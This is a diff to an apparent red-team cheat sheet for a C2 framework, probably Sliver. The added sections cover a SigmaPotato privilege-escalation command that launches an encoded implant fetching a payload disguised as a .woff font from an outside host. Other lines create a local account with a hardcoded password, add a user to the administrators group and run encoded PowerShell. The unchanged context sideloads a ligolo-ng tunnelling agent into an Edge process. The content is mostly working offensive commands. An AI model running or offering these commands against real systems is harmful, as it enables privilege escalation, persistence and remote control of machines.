@@ -54,3 +54,25 @@ uac_bypass_cmstp <path_to_exe>
 ```bash
 sideload -k --process "C:\Program Files (x86)\Microsoft\Edge\Application\126.0.2592.102\identity_helper.exe" /home/jubeaz/tmp/ligolo-ng-agent.exe -ignore-cert -connect 10.10.14.6:11601
 ```
+
+
+## tools - sigmapotato
+```bash
+execute-assembly /srv/http/upload/lib/SigmaPotato.exe '"c:\tmp\SlvrCT.exe -m -c zlib -e RChIK0tiUGVTaFZtWXEzdDZ2OXkkQiZFKUhATWNRZlQ=  http://10.10.14.30/sl_cyber/jubeaz.woff"'
+```
+
+## tools - add user to group
+```bash
+remote-addusertogroup  <domain> <computer> <user> <group|administrators>
+```
+
+## tools - create local account
+```bash
+remote-adduser jubeaz Zaebuj12345+- ""
+```
+
+
+## tools - powershell
+```bash
+execute -o powershell -e <base64enc>
+```
